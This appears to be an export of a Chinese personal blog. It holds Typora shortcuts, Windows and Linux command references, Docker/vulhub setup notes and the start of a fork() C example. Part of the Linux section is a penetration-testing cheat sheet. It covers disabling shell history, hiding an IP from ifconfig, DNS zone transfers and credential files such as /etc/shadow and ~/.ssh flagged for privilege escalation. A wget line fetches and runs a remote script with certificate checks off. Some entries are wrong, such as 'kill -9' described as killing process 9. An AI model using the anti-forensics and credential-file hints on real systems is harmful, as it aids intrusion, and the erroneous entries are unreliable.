<li>撤销： <code>ctrl</code> + <code>Z</code></li>
<li>重做： <code>ctrl</code> + <code>Y</code></li>
<li>剪切： <code>ctrl</code> + <code>X</code></li>
<li>粘贴： <code>ctrl</code> + <code>V</code></li>
<li>复制为Markdown：<code>ctrl</code> + <code>shift</code> + <code>C</code></li>
<li>粘贴为纯文本： <code>ctrl</code> + <code>shift</code> + <code>C</code></li>
<li>全选： <code>ctrl</code> + <code>A</code></li>
<li>选中当前行： <code>ctrl</code> + <code>L</code></li>
<li>选中当前词： <code>ctrl</code> + <code>D</code></li>
<li>跳转到文首： <code>ctrl</code> + <code>Home</code></li>
<li>跳转到文末：<code>ctrl</code> + <code>End</code></li>
<li>跳转到所选内容：<code>ctrl</code> + <code>J</code></li>
<li>查找：ctrl+ F<ul>
<li>查找下一个：<code>F3</code></li>
<li>查找上一个： <code>shift</code> + <code>F3</code></li>
<li>替换： <code>ctrl</code> + <code>H</code></li>
</ul>
</li>
</ul>
<h4 id="段落类"><a href="#段落类" class="headerlink" title="段落类"></a>段落类</h4><ul>
<li>一级标题： <code>ctrl</code> + <code>1</code></li>
<li>二级标题： <code>ctrl</code> + <code>2</code></li>
<li>六级标题： <code>ctrl</code> + <code>6</code></li>
<li>段落： <code>ctrl</code> + <code>0</code></li>
<li>提升标题级别： <code>ctrl</code> + <code>=</code></li>
<li>降低标题级别： <code>ctrl</code> + <code>-</code></li>
<li>表格： <code>ctrl</code> + <code>T</code></li>
<li>代码块： <code>ctrl</code> + <code>shift</code> + <code>K</code></li>
<li>公式块： <code>ctrl</code> + <code>shift</code> + <code>M</code></li>
<li>引用： <code>ctrl</code> + <code>shift</code> + <code>Q</code></li>
<li>有序列表： <code>ctrl</code> + <code>shift</code> + <code>[</code></li>
<li>无序列表： <code>ctrl</code> + <code>shift</code> + <code>]</code></li>
</ul>
<h4 id="格式类"><a href="#格式类" class="headerlink" title="格式类"></a>格式类</h4><ul>
<li>加粗： <code>ctrl</code> + <code>B</code></li>
<li>斜体： <code>ctrl</code> + <code>I</code></li>
<li>下划线： <code>ctrl</code> + <code>U</code></li>
<li>代码： <code>ctrl</code> + <code>shift</code> +   `</li>
<li>删除线： <code>ctrl</code> + <code>shift</code> <code>5</code></li>
<li>超链接：<code>ctrl</code> + <code>K</code></li>
<li>图像： <code>ctrl</code> + <code>shift</code> + <code>I</code></li>
<li>清楚样式： <code>ctrl</code> + <code>\</code></li>
</ul>
<h4 id="视图类"><a href="#视图类" class="headerlink" title="视图类"></a>视图类</h4><ul>
<li>显示/隐藏 侧边栏： <code>ctrl</code> + <code>shift</code> + <code>L</code></li>
<li>大纲视图： <code>ctrl</code> + <code>shift</code> + <code>1</code></li>
<li>文档列表视图： <code>ctrl</code> + <code>shift</code> + 2</li>
<li>搜索： <code>ctrl</code> + <code>shift</code> + <code>F</code></li>
<li>源代码模式： <code>ctrl</code> + <code>/</code></li>
<li>专注模式： <code>F8</code></li>
<li>打字模式： <code>F9</code></li>
<li>切换全屏： <code>F11</code></li>
<li>放大： <code>ctrl</code> + <code>shift</code> + <code>=</code></li>
<li>缩小： <code>ctrl</code> + <code>shift</code> + <code>-</code></li>
<li>应用内窗口切换： <code>ctrl</code> + <code>tab</code></li>
<li>开发者工具： <code>shift</code> + <code>F12</code></li>
</ul>
<p>Xshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>  wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>  chmod +x shadowsocks-all.sh</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>  ./shadowsocks-all.sh <span class="number">2</span>&gt;&amp;<span class="number">1</span> | tee shadowsocks-all.log</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> 选择ShowdowsocksR</span><br></pre></td></tr></table></figure>

<h4 id="windows常用cmd命令"><a href="#windows常用cmd命令" class="headerlink" title="windows常用cmd命令"></a><strong>windows常用cmd命令</strong></h4><p>taskkill /f /t /im  后面再更上应用程序的名字 –关闭程序</p>
<table>
<thead>
<tr>
<th>DEL</th>
<th>删除至少一个文件。</th>
</tr>
</thead>
<tbody><tr>
<td>DIR</td>
<td>显示一个目录中的文件和子目录。</td>
</tr>
<tr>
<td>MD</td>
<td>创建一个目录。</td>
</tr>
<tr>
<td>MKDIR</td>
<td>创建一个目录。</td>
</tr>
<tr>
<td>RD</td>
<td>删除目录。</td>
</tr>
<tr>
<td>TREE</td>
<td>以图形方式显示驱动程序或路径的目录结构。</td>
</tr>
<tr>
<td>type</td>
<td>显示文件内容</td>
</tr>
<tr>
<td>CLS</td>
<td>清除屏幕。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>ipconfig</th>
<th>查看网络配置</th>
</tr>
</thead>
<tbody><tr>
<td>netstat</td>
<td>查看网络状态</td>
</tr>
<tr>
<td>ping</td>
<td>检查与目标主机的连通性</td>
</tr>
<tr>
<td>tracert</td>
<td>查看与目标主机的路由节点</td>
</tr>
<tr>
<td>route print</td>
<td>打印与目标主机的路由</td>
</tr>
<tr>
<td>arp</td>
<td>查看本机的ARP缓存表</td>
</tr>
<tr>
<td>nslookup</td>
<td>查看DNS域名解析记录</td>
</tr>
<tr>
<td>net</td>
<td>网络管理</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux</title>
    <url>/2020/03/06/Linux/</url>
    <content><![CDATA[<hr>
<p>title: Linux<br>date: 2020-03-06 19:49:59<br>tags: Linux<br>categories: Linux学习</p>
<hr>
<h2 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a><strong>Linux常用命令</strong></h2><p>有些命令学了老是忘，这里就记录一些自己常用的命令~</p>
<table>
<thead>
<tr>
<th align="left">常用查询命令</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>more -5 proxy.py</strong></td>
<td align="left"><strong>每5行为1页，按空格键切换下一页，回车键为下一行</strong></td>
</tr>
<tr>
<td align="left"><strong>ls -lha | more -5</strong></td>
<td align="left"><strong>按q即可退出</strong></td>
</tr>
<tr>
<td align="left"><strong>echo hello &gt; kail.txt</strong></td>
<td align="left"><strong>直接覆盖原本的内容</strong></td>
</tr>
<tr>
<td align="left"><strong>echo hello &gt;&gt;kail.txt</strong></td>
<td align="left"><strong>追加在原本的内容上</strong></td>
</tr>
<tr>
<td align="left"><strong>find  /root  -name  proxy.py</strong></td>
<td align="left"><strong>搜索root目录下，名为proxy.py的文件</strong></td>
</tr>
<tr>
<td align="left"><strong>find .  -ctime  -20</strong></td>
<td align="left"><strong>搜索当前目录下，最近20天内更新过的所有文件</strong></td>
</tr>
<tr>
<td align="left"><strong>find .  -cmin   -20</strong></td>
<td align="left"><strong>搜索当前目录下，最近20分钟内更新过的所有文件</strong></td>
</tr>
<tr>
<td align="left"><strong>find  .       -name    ‘  *.py  ‘     -a     -type f</strong></td>
<td align="left"><strong>注意加单引号表示转义</strong></td>
</tr>
<tr>
<td align="left"><strong>-a   表示  and  ，-o 表示or</strong></td>
<td align="left"><strong>type表示文件类型，f文件、d目录、l链接文件</strong></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left">常用文件操作命令</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>mv proxy.py     ~/desktop/kaillinux/</strong></td>
<td align="left"><strong>移动文件到指定目录下，这是剪切</strong></td>
</tr>
<tr>
<td align="left"><strong>cp -r kaillinux/  ~</strong></td>
<td align="left"><strong>复制kaillinux到~目录下，注意需要加-r（mv可不加）</strong></td>
</tr>
<tr>
<td align="left"><strong>mv proxy.py ssh_proxy.py</strong></td>
<td align="left"><strong>重命名为ssh_proxy.py</strong></td>
</tr>
<tr>
<td align="left"><strong>cat -b xx.txt  /  cat -n xx.txt</strong></td>
<td align="left"><strong>显示行号 去除空行 /  显示行号 包含空行</strong></td>
</tr>
<tr>
<td align="left"><strong>ps -aux</strong></td>
<td align="left"><strong>显示所有包含其他使用者的行程</strong></td>
</tr>
<tr>
<td align="left"><strong>ps -ef</strong></td>
<td align="left"><strong>显示所有命令，连带命令行</strong></td>
</tr>
<tr>
<td align="left"><strong>ps -u root</strong></td>
<td align="left"><strong>显示 root 进程用户信息</strong></td>
</tr>
<tr>
<td align="left"><strong>ps aux  |  grep tcp</strong></td>
<td align="left"><strong>查找对应服务的进程</strong></td>
</tr>
<tr>
<td align="left"><strong>kill -9</strong></td>
<td align="left"><strong>找到对应的PID以后，杀死id为9的进程，kill只能杀死单进程</strong></td>
</tr>
<tr>
<td align="left"><strong>pkill -9  httpd</strong></td>
<td align="left"><strong>pkill和killall可杀死多个进程，直接杀死程序(httpd为程序名)</strong></td>
</tr>
</tbody></table>
<hr>
<h2 id="操作系统信息收集"><a href="#操作系统信息收集" class="headerlink" title="操作系统信息收集"></a>操作系统信息收集</h2><table>
<thead>
<tr>
<th>本地信息查看命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>whoami</strong></td>
<td><strong>显示 Linux 上当前已登录用户。</strong></td>
</tr>
<tr>
<td><strong>id</strong></td>
<td><strong>向用户显示当前已登录的用户和组。</strong></td>
</tr>
<tr>
<td><strong>last</strong></td>
<td><strong>显示最后一次登陆的用户。</strong></td>
</tr>
<tr>
<td><strong>mount</strong></td>
<td><strong>显示已挂载的驱动。</strong></td>
</tr>
<tr>
<td><strong>df -h</strong></td>
<td><strong>用人类可读的输出显示磁盘使用情况。</strong></td>
</tr>
<tr>
<td><strong>echo “user:passwd” | chpasswd</strong></td>
<td><strong>用一行命令重置密码。</strong></td>
</tr>
<tr>
<td><strong>getent passwd</strong></td>
<td><strong>列出 Linux 上的用户。</strong></td>
</tr>
<tr>
<td><strong>strings /usr/local/bin/blah</strong></td>
<td><strong>显示非文本文件的内容，例如：一个二进制文件里面有什么。</strong></td>
</tr>
<tr>
<td><strong>uname -ar</strong></td>
<td><strong>显示运行中的内核版本。</strong></td>
</tr>
<tr>
<td><strong>PATH=$PATH:/my/new-path</strong></td>
<td><strong>添加一个新的路径，方便进行本地文件系统（FS）操作。</strong></td>
</tr>
<tr>
<td><strong>history</strong></td>
<td><strong>显示用户在之前执行的 bash 脚本历史记录，还有敲入的命令。</strong></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>常见操作命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>netstat -tulpn</strong></td>
<td><strong>在 Linux 中显示对应了进程ID（PID）的网络端口。</strong></td>
</tr>
<tr>
<td><strong>watch ss -stplu</strong></td>
<td><strong>通过套接字实时观察 TCP, UDP 端口。</strong></td>
</tr>
<tr>
<td><strong>lsof -i</strong></td>
<td><strong>显示确认了的连接。</strong></td>
</tr>
<tr>
<td><strong>macchanger -m MACADDR INTR</strong></td>
<td><strong>在 KALI Linux 上修改 MAC 地址。</strong></td>
</tr>
<tr>
<td><strong>ifconfig eth0 192.168.2.1/24</strong></td>
<td><strong>在 Linux 中设置 ID 地址。</strong></td>
</tr>
<tr>
<td><strong>ifconfig eth0:1 192.168.2.3/24</strong></td>
<td><strong>在 Linux 中向现有的网络接口添加 IP 地址。</strong></td>
</tr>
<tr>
<td><strong>ifconfig eth0 hw ether MACADDR</strong></td>
<td><strong>使用 ifconfig 修改 Linux 中的 MAC 地址。</strong></td>
</tr>
<tr>
<td><strong>ifconfig eth0 mtu 1500</strong></td>
<td><strong>在 Linux 中使用 ifconfig 修改 MTU 的大小，将 1500 改为你想要的 MTU。</strong></td>
</tr>
<tr>
<td><strong>dig -x 192.168.1.1</strong></td>
<td><strong>对 IP 地址进行反向查找。</strong></td>
</tr>
<tr>
<td><strong>host 192.168.1.1</strong></td>
<td><strong>在一个 IP 地址上进行反向查找，适用于没有安装 dig 的情况。</strong></td>
</tr>
<tr>
<td><strong>dig @192.168.2.2 domain.com -t AXFR</strong></td>
<td><strong>使用 dig 执行一次 DNS 区域传输。</strong></td>
</tr>
<tr>
<td><strong>host -l domain.com nameserver</strong></td>
<td><strong>使用 host 执行一次 DNS 区域传输。</strong></td>
</tr>
<tr>
<td><strong>nbtstat -A x.x.x.x</strong></td>
<td><strong>获取 IP 地址对应的域名。</strong></td>
</tr>
<tr>
<td><strong>ip addr add 192.168.2.22/24 dev eth0</strong></td>
<td><strong>向 Linux 添加一个隐藏的 IP 地址，在执行 ifconfig 命令时不会显示这个 IP 地址。</strong></td>
</tr>
<tr>
<td><strong>tcpkill -9 host google.com</strong></td>
<td><strong>阻止从主机访问 google.com。</strong></td>
</tr>
<tr>
<td><strong>echo “1” &gt; /proc/sys/net/ipv4/ip_forward</strong></td>
<td><strong>启用 IP 转发，将 Linux 盒子变成一个路由器——这样就方便通过这个盒子来进行路由流量的控制。</strong></td>
</tr>
<tr>
<td><strong>echo “8.8.8.8” &gt; /etc/resolv.conf</strong></td>
<td><strong>使用 Google 的 DNS。</strong></td>
</tr>
</tbody></table>
<p><strong>查看服务器版本：</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*<span class="literal">-release</span></span><br><span class="line">cat /etc/lsb<span class="literal">-release</span> <span class="comment"># 基于 Debian</span></span><br><span class="line">cat /etc/redhat<span class="literal">-release</span> <span class="comment"># 基于 Redhat</span></span><br></pre></td></tr></table></figure>

<p><strong>查看内核的版本信息？</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls /boot | grep vmlinuz-</span><br></pre></td></tr></table></figure>







<h4 id><a href="#" class="headerlink" title></a></h4><p><strong>基于 Redhat / CentOS / RPM 的发行版</strong></p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>cat /etc/redhat-release</td>
<td>显示 Redhat / CentOS 版本号。</td>
</tr>
<tr>
<td>rpm -qa</td>
<td>在基于 RPM 的 Linux 上列出所有已经安装上的 RPM 包。</td>
</tr>
<tr>
<td>rpm -q –changelog openvpn</td>
<td>检查已安装的 RPM 是否针对 CVE 打了补丁，可以用 grep 命令过滤出跟 CVE 有关的输出。LeoXu</td>
</tr>
</tbody></table>
<p><strong>基于 Debian / Ubuntu / .deb 的发行版</strong> </p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>cat /etc/debian_version</td>
<td>显示 Debian 版本号。</td>
</tr>
<tr>
<td>cat /etc/*-release</td>
<td>显示 Ubuntu 版本号。</td>
</tr>
<tr>
<td>dpkg -l</td>
<td>在基于 Debian / .deb 的 Linux 发行版上列出所有已安装的包。</td>
</tr>
</tbody></table>
<h2 id="Linux-用户管理"><a href="#Linux-用户管理" class="headerlink" title="Linux 用户管理"></a><strong>Linux 用户管理</strong></h2><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>useradd new-user</td>
<td>创建一个新的 Linux 用户。</td>
</tr>
<tr>
<td>passwd username</td>
<td>重置 Linux 用户密码, 如果你是 root 用户，只要输入密码就行了。</td>
</tr>
<tr>
<td>deluser username</td>
<td>删除一个 Linux 用户。</td>
</tr>
</tbody></table>
<h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><h2 id="Linux-解压缩命令"><a href="#Linux-解压缩命令" class="headerlink" title="Linux 解压缩命令"></a><strong>Linux 解压缩命令</strong></h2><p>如何在 Linux 上解析不同的压缩包 (tar, zip, gzip, bzip2 等等) ，以及其它的一些用来在压缩包中进行搜索等操作的小技巧。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>unzip archive.zip</td>
<td>在 Linux 上提取 zip 包中的文件。</td>
</tr>
<tr>
<td>zipgrep *.txt archive.zip</td>
<td>在一个 zip 压缩包中搜索。</td>
</tr>
<tr>
<td>tar xf archive.tar</td>
<td>在 Linux 上提取 tar 包中的文件。</td>
</tr>
<tr>
<td>tar xvzf archive.tar.gz</td>
<td>在 Linux 上提取 tar.gz 包中的文件。</td>
</tr>
<tr>
<td>tar xjf archive.tar.bz2</td>
<td>在 Linux 上提取 tar.bz2 包中的文件。</td>
</tr>
<tr>
<td>tar ztvf file.tar.gz | grep blah</td>
<td>在一个 tar.gz 文件中搜索。</td>
</tr>
<tr>
<td>gzip -d archive.gz</td>
<td>在 Linux 上提取 gzip 中的文件。</td>
</tr>
<tr>
<td>zcat archive.gz</td>
<td>在 Linux 以不解压缩的方式读取一个 gz 文件。</td>
</tr>
<tr>
<td>zless archive.gz</td>
<td>用较少的命令实现对 .gz 压缩包相同的功能。</td>
</tr>
<tr>
<td>zgrep ‘blah’ /var/log/maillog*.gz</td>
<td>在 Linux 上对 .gz 压缩包里面的内容执行搜索，比如搜索被压缩过的日志文件。</td>
</tr>
<tr>
<td>vim file.txt.gz</td>
<td>使用 vim 读取 .txt.gz 文件（我个人的最爱）。</td>
</tr>
<tr>
<td>upx -9 -o output.exe input.exe</td>
<td>在 Linux 上使用 UPX 压缩 .exe 文件。</td>
</tr>
</tbody></table>
<h2 id="Linux-压缩命令"><a href="#Linux-压缩命令" class="headerlink" title="Linux 压缩命令"></a><strong>Linux 压缩命令</strong></h2><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>zip -r file.zip /dir/*</td>
<td>在 Linux 上创建一个 .zip 文件。</td>
</tr>
<tr>
<td>tar cf archive.tar files</td>
<td>在 Linux 上创建一个 tar 文件。</td>
</tr>
<tr>
<td>tar czf archive.tar.gz files</td>
<td>在 Linux 上创建一个 tar.gz 文件。</td>
</tr>
<tr>
<td>tar cjf archive.tar.bz2 files</td>
<td>在 Linux 上创建一个 tar.bz2 文件。</td>
</tr>
<tr>
<td>gzip file</td>
<td>在 Linux 上创建一个 .gz 文件。</td>
</tr>
</tbody></table>
<h3 id="-2"><a href="#-2" class="headerlink" title></a></h3><h2 id="Linux-文件命令"><a href="#Linux-文件命令" class="headerlink" title="Linux 文件命令"></a><strong>Linux 文件命令</strong></h2><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>df -h blah</td>
<td>在 Linux 上显示文件/目录的大小。</td>
</tr>
<tr>
<td>diff file1 file2</td>
<td>在 Linux 上比对/显示两个文件之间的差别。</td>
</tr>
<tr>
<td>md5sum file</td>
<td>在 Linux 上生成 MD5 摘要。</td>
</tr>
<tr>
<td>md5sum -c blah.iso.md5</td>
<td>在 Linux 上检查文件的 MD5 摘要，这里假设文件和 .md5 处在相同的路径下。</td>
</tr>
<tr>
<td>file blah</td>
<td>在 Linux 上查找出文件的类型，也会将文件是 32 还是 64 位显示出来。</td>
</tr>
<tr>
<td>dos2unix</td>
<td>将 Windows 的行结束符转成 Unix/Linux 的。</td>
</tr>
<tr>
<td>base64 &lt; input-file &gt; output-file</td>
<td>对输入文件进行 Base64 编码，然后输出一个叫做 output-file 的 Base64 编码文件。</td>
</tr>
<tr>
<td>base64 -d &lt; input-file &gt; output-file</td>
<td>对输入文件进行 Base64 解码，然后输出一个叫做 output-file 的 Base64 解码文件。</td>
</tr>
<tr>
<td>touch -r ref-file new-file</td>
<td>使用来自于引用文件的时间戳数据创建一个新文件，放上 -r 以简单地创建一个文件。</td>
</tr>
<tr>
<td>rm -rf</td>
<td>不显示确认提示就删除文件和目录。</td>
</tr>
</tbody></table>
<h3 id="-3"><a href="#-3" class="headerlink" title></a></h3><h3 id="Misc-命令"><a href="#Misc-命令" class="headerlink" title="Misc 命令"></a>Misc 命令</h3><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>init 6</td>
<td>从命令行重启 Linux 。</td>
</tr>
<tr>
<td>gcc -o output.c input.c</td>
<td>编译 C 代码。</td>
</tr>
<tr>
<td>gcc -m32 -o output.c input.c</td>
<td>交叉编译 C 代码，在 64 位 Linux 上将编译出 32 位的二进制文件。</td>
</tr>
<tr>
<td>unset HISTORYFILE</td>
<td>关闭 bash 历史日志记录功能。</td>
</tr>
<tr>
<td>rdesktop X.X.X.X</td>
<td>从 Linux 连接到 RDP 服务器。</td>
</tr>
<tr>
<td>kill -9 $$</td>
<td>关掉当前的会话。</td>
</tr>
<tr>
<td>chown user:group blah</td>
<td>修改文件或者目录的所有者。</td>
</tr>
<tr>
<td>chown -R user:group blah</td>
<td>修改文件或者目录，以及目录下面文件/目录的拥有者 —— 递归执行 chown。</td>
</tr>
<tr>
<td>chmod 600 file</td>
<td>修改文件/目录的权限设定, 详情见 <a href="#linux-file-system-permissions">Linux 文件系统权限</a> 。</td>
</tr>
</tbody></table>
<h3 id="Linux-文件系统权限"><a href="#Linux-文件系统权限" class="headerlink" title="Linux 文件系统权限"></a>Linux 文件系统权限</h3><table>
<thead>
<tr>
<th>取值</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td>777</td>
<td>rwxrwxrwx 没有限制，完全可读可写可执行（RWX），用户可以做任何事情。</td>
</tr>
<tr>
<td>755</td>
<td>rwxr-xr-x 拥有者可完全访问，其他人只能读取和执行文件。</td>
</tr>
<tr>
<td>700</td>
<td>rwx—— 拥有者可完全访问，其他人都不能访问。</td>
</tr>
<tr>
<td>666</td>
<td>rw-rw-rw- 所有人可以读取和写入，但不可执行。</td>
</tr>
<tr>
<td>644</td>
<td>rw-r–r– 拥有者可以读取和写入，其他人只可以读取。</td>
</tr>
<tr>
<td>600</td>
<td>rw——- 拥有者可以读取和写入，其他人都不能访问。</td>
</tr>
</tbody></table>
<h3 id="-4"><a href="#-4" class="headerlink" title></a></h3><h3 id="Linux-文件系统的渗透测试备忘录"><a href="#Linux-文件系统的渗透测试备忘录" class="headerlink" title="Linux 文件系统的渗透测试备忘录"></a>Linux 文件系统的渗透测试备忘录</h3><table>
<thead>
<tr>
<th>目录</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>/</td>
<td>/ 也被称为“斜杠”或者根。</td>
</tr>
<tr>
<td>/bin</td>
<td>由系统、系统管理员以及用户共享的通用程序。</td>
</tr>
<tr>
<td>/boot</td>
<td>Boot 文件, 启动加载器(grub), 内核, vmlinuz</td>
</tr>
<tr>
<td>/dev</td>
<td>包含了对系统设备、带有特殊属性的文件的引用。</td>
</tr>
<tr>
<td>/etc</td>
<td>重要的系统配置文件。</td>
</tr>
<tr>
<td>/home</td>
<td>系统用户的主目录。</td>
</tr>
<tr>
<td>/lib</td>
<td>库文件，包括系统和用户都需要的所有类型的程序的文件。</td>
</tr>
<tr>
<td>/lost+found</td>
<td>文件操作失败会被保存在这里。</td>
</tr>
<tr>
<td>/mnt</td>
<td>外部文件系统的标准挂载点。</td>
</tr>
<tr>
<td>/media</td>
<td>外部文件系统（或者某些发行版）的挂载点。</td>
</tr>
<tr>
<td>/net</td>
<td>整个远程文件系统的标准挂载点 —— nfs。</td>
</tr>
<tr>
<td>/opt</td>
<td>一般都是包含一些附加的或者第三方软件。</td>
</tr>
<tr>
<td>/proc</td>
<td>一个包含了系统资源相关信息的虚拟文件系统。</td>
</tr>
<tr>
<td>/root</td>
<td>root 用户的主目录。</td>
</tr>
<tr>
<td>/sbin</td>
<td>由系统和系统管理员来使用的程序。</td>
</tr>
<tr>
<td>/tmp</td>
<td>供系统使用的临时空间，重启时会被清空。</td>
</tr>
<tr>
<td>/usr</td>
<td>供所有用户相关程序使用的程序、库、文档等等。</td>
</tr>
<tr>
<td>/var</td>
<td>存储所有由用户创建的可变文件和临时文件，比如日志文件、邮件队列、后台打印程序，Web服务器，数据库等等。</td>
</tr>
</tbody></table>
<h3 id="-5"><a href="#-5" class="headerlink" title></a></h3><h3 id="Linux-中有趣的文件-目录"><a href="#Linux-中有趣的文件-目录" class="headerlink" title="Linux 中有趣的文件/目录"></a>Linux 中有趣的文件/目录</h3><p>如果你想尝试进行特权升级/执行后期开发，这些都是你值得一瞧的命令。</p>
<table>
<thead>
<tr>
<th>路径</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>/etc/passwd</td>
<td>包含了本地 Linux 的用户。</td>
</tr>
<tr>
<td>/etc/shadow</td>
<td>包含了哈希过的本地账户密码。</td>
</tr>
<tr>
<td>/etc/group</td>
<td>包含了本地账户分组。</td>
</tr>
<tr>
<td>/etc/init.d/</td>
<td>包含了服务网初始化脚本 – 具体都安装了些啥应该值得一瞧。</td>
</tr>
<tr>
<td>/etc/hostname</td>
<td>系统的 hostname。</td>
</tr>
<tr>
<td>/etc/network/interfaces</td>
<td>网络接口。</td>
</tr>
<tr>
<td>/etc/resolv.conf</td>
<td>系统的 DNS 服务。</td>
</tr>
<tr>
<td>/etc/profile</td>
<td>系统的环境变量。</td>
</tr>
<tr>
<td>~/.ssh/</td>
<td>SSH 密钥。</td>
</tr>
<tr>
<td>~/.bash_history</td>
<td>用户的 bash 历史日志。</td>
</tr>
<tr>
<td>/var/log/</td>
<td>Linux 系统的日志文件一般就被存放在这里。</td>
</tr>
<tr>
<td>/var/adm/</td>
<td>UNIX 系统的日志文件一般就被存在在这里。</td>
</tr>
<tr>
<td>/var/log/apache2/access.log/var/log/httpd/access.log</td>
<td>Apache 访问日志文件通常的存在路径。</td>
</tr>
<tr>
<td>/etc/fstab</td>
<td>挂载的文件系统。</td>
</tr>
</tbody></table>
<hr>
<h2 id="docker常用命令"><a href="#docker常用命令" class="headerlink" title="docker常用命令"></a><strong>docker常用命令</strong></h2><p>1 <strong>docker images</strong> 查看镜像信息列表 镜像是静态的</p>
<p>2 <strong>docker ps -a</strong> 查看运行中的所有容器</p>
<p>3 <strong>docker search [images]:[version]</strong>从dockerhub查询指定镜像</p>
<p>4 <strong>docker pull [images]:[version]</strong>从dockerhub拉取指定镜像</p>
<p>4 <strong>docker run -p 8000:80 -tdi  [imageID]</strong> 后台启动docker,并指定宿主机端口和docker映射端口。</p>
<p> <strong>-i:</strong>以交互模式运行容器，通常与 -t 同时使用；</p>
<p> <strong>-d:</strong>后台运行容器，并返回容器ID；</p>
<p><strong>-t:</strong>为容器重新分配一个伪输入终端，通常与 -i 同时使用；</p>
<p>5 当镜像通过run 启动后，便会载入到一个动态的container(容器)中运行，此时若需要进入终端交互模式：</p>
<p><strong>sudo docker exec -it [containerID] /bin/bash</strong></p>
<p>交互模式中，使用 ctrl+p+q退出交互 保持运行,使用 exit命令退出并停止容器。</p>
<p>6 在容器非交互模式下，通过docker start/stop 命令来启动/停止已部署的容器服务。</p>
<p>7 <strong>docker rm [containerID]</strong> 删除容器</p>
<p>8 <strong>docker rmi [imageID]</strong> 删除镜像</p>
<p>9 <strong>docker cp [YourHostFilePath] [containerID]:[DockerPath]</strong> 将宿主机内的指定文件传输至容器内部的指定地址。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service docker start</span><br><span class="line">cd &#x2F;vulhub&#x2F;activemq&#x2F;CVE-2015-5254</span><br><span class="line">docker-compose up -d  #构建漏洞环境，这个命令包括了docker-compose build</span><br></pre></td></tr></table></figure>

<p>环境关闭</p>
<p><strong>docker-compose down</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u root -p root</span><br></pre></td></tr></table></figure>

<h2 id="Deb包的安装"><a href="#Deb包的安装" class="headerlink" title="Deb包的安装"></a><strong>Deb包的安装</strong></h2><p>dpkg 是Debian package的简写，为”Debian“ 操作系统 专门开发的套件管理系统，用于软件的安装，更新和移除。</p>
<p>所有源自”Debian”的Linux的发行版都使用 dpkg,  例如”Ubuntu”</p>
<p><strong>实例:dpkg -i ~/Download/mozybackup_i386.deb</strong></p>
<p>命令:dpkg -L package</p>
<p><strong>安装完包后，可以用此命令查看软件安装到什么地方</strong></p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>dpkg -r  package</strong></td>
<td><strong>移除软件，保留配置</strong></td>
</tr>
<tr>
<td><strong>dpkg -P package</strong></td>
<td><strong>移除软件，不保留配值</strong></td>
</tr>
</tbody></table>
<hr>
<h2 id="进程控制编程"><a href="#进程控制编程" class="headerlink" title="进程控制编程"></a><strong>进程控制编程</strong></h2><h3 id="fork"><a href="#fork" class="headerlink" title="fork()"></a><strong>fork()</strong></h3><p><strong>getpid / getppid</strong> </p>
<p><strong>getpid:得到当前进程的PID</strong></p>
<p><strong>getppid:得到当前进程的父进程的PID</strong></p>
<p><strong>fork实例代码如下：</strong></p>
<p><strong>父子进程的执行顺序—-不一定，谁抢到cpu谁执行</strong></p>
<p><strong>父进程会生成 n(n+1)/2+1个子进程,N 为循环次数</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"--------i = %d\n"</span>, i);</span><br><span 